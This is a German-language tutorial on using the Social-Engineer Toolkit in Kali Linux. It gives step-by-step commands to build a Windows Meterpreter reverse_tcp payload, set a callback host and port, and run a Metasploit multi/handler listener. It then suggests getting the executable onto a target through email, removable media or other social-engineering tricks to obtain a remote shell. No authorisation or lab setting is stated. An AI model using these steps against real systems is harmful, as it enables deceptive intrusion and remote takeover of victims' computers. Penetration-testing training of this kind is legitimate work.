# Bassics

**1. SET starten**

Öffne in Kali Linux ein Terminal und starte SET mit Root-Rechten:

```bash
sudo setoolkit
```

***

#### 2. Angriffsmethode auswählen

Im Hauptmenü von SET wählst du die Option für Social-Engineering-Angriffe. Je nach SET-Version gibt es unterschiedliche Menüpunkte. Häufig findest du folgende Option:

* **"Social-Engineering Attacks"**\
  Anschließend wählst du den Menüpunkt, der es dir ermöglicht, einen Payload zu generieren und gleich einen Listener zu starten. Dies kann beispielsweise **"Create a Payload and Listener"** oder **"Infectious Media Generator"** heißen.

Falls deine SET-Version direkt eine Option zur Payload-Erzeugung bietet, wähle diese aus.

***

#### 3. Payload-Typ festlegen

Sobald du im Payload-Generator bist, wirst du gefragt, welchen Payload-Typ du verwenden möchtest. Für eine Meterpreter TCP Shell auf einem Windows-System wähle:

```plaintext
windows/meterpreter/reverse_tcp
```

Manche SET-Versionen bieten eine Liste an, in der du den entsprechenden Payload (z. B. „meterpreter\_reverse\_tcp“) auswählen kannst.

***

#### 4. Netzwerkeinstellungen konfigurieren

Du wirst nun aufgefordert, die Verbindungsparameter einzugeben:

* **LHOST:** Gib hier die IP-Adresse ein, an die sich der Payload zurückverbindet (z. B. `192.168.53.197`).
* **LPORT:** Gib den gewünschten Port ein (z. B. `4444`).

Stelle sicher, dass auf deinem System keine Firewall den Zugriff auf diesen Port blockiert.

***

#### 5. Payload generieren

Nachdem du alle Parameter eingegeben hast, bestätigt SET deine Eingaben und beginnt mit der Erzeugung des Payloads. Der generierte Payload wird als ausführbare Datei (z. B. **payload.exe**) gespeichert. In der Ausgabe von SET wird in der Regel der Speicherort angezeigt (häufig im SET-Verzeichnis oder in einem Unterordner wie `/root/.set/`).

***

#### 6. Listener starten

Oft bietet SET an, nach der Payload-Erzeugung direkt einen Listener zu starten. Bestätige diese Option, um automatisch einen Metasploit-Listener mit den zuvor angegebenen Einstellungen zu öffnen.

Falls dies nicht automatisch geschieht, kannst du in einem neuen Terminal manuell einen Multi/Handler in Metasploit starten:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.53.197
set LPORT 4444
exploit
```

Damit wartest du darauf, dass der Payload eine Verbindung zu deinem Listener aufbaut.

***

#### 7. Den Payload auf das Zielsystem bringen

Nun hast du den **payload.exe** generiert. Überlege dir, wie du diesen an das Zielsystem verteilen möchtest – sei es per E-Mail, über Wechseldatenträger oder über andere Social-Engineering-Techniken.

***

#### 8. Verbindung erhalten

Sobald das Zielsystem den Payload ausführt, wird eine Verbindung zu deinem Listener hergestellt und du erhältst eine aktive Meterpreter-Shell. Diese kannst du dann nutzen, um weitere Informationen über das System abzurufen oder weitere Aktionen durchzuführen.

####
